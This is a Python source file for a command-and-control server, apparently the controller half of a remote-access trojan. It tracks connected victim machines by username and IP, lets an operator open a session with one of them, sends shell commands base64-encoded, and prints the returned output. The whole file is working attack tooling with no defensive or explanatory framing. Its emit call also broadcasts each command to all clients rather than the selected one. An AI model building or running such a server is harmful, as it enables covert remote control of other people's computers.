import socketio, flask, json, os, threading, time, waitress, logging, base64, sys
log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)

socket = socketio.Server()
app = flask.Flask(__name__)
app.secret_key = os.urandom(32).hex()
app.wsgi_app = socketio.WSGIApp(socket, app.wsgi_app)

clients = []
responses = []

@socket.event
def result(sid, message):
    for client in clients:
        if client["sid"] == sid:
            decoded_msg = base64.b64decode(json.loads(message)["result"]).decode()
            responses.append({"sid": sid, "message": decoded_msg, "cmd": json.loads(message)["cmd"]})

@socket.on("connect")
def connect(sid, data):
    clients.append({"sid": sid})

@socket.on("disconnect")
def disconnect(sid):
    for client in clients:
        if client["sid"] == sid:
            clients.remove(client)

@socket.event
def init(sid, message):
    data = json.loads(message)
    for client in clients:
        if client["sid"] == sid:
            client["ip"] = data["ip"]
            client["username"] = data["username"]

threading.Thread(target=lambda: app.run(host="0.0.0.0", port=5000, debug=False)).start()
os.system("clear")

while True:
    commands = ["clients", "connect"]
    cmd = input("[server.py]: ")
    if cmd.split(" ")[0] not in commands:
        print("[!] Command not found")
    
    if cmd == "clients":
        for i in range(len(clients)):
            client = clients[i]
            print(f"[{i}] {client['username']}@{client['ip']}")
        
        if not clients:
            print("[!] No clients found")

    if cmd.split(" ")[0] == "connect":
        if len(cmd.split(" ")) > 1:
            client_select = int(cmd.split(" ")[1])
            try:
                client = clients[client_select]
            except:
                print("[!] Client does not exists")
                continue
            try:
                while True:
                    sess_cmd = input(f"[{client['username']}@{client['ip']}]: ")
                    if not sess_cmd:
                        continue

                    socket.emit("command", base64.b64encode(sess_cmd.encode()))

                    while not client["sid"] in [x["sid"] for x in responses]:
                        pass

                    while not sess_cmd in [x["cmd"] for x in responses]:
                        pass

                    for response in responses:
                        if response["sid"] == client["sid"]:
                            if response["cmd"] == sess_cmd:
                                print(response["message"])
                                responses.remove(response)


            except KeyboardInterrupt:
                print("\n[!] Exiting session")
        else:
            print("[!] Please select a valid client")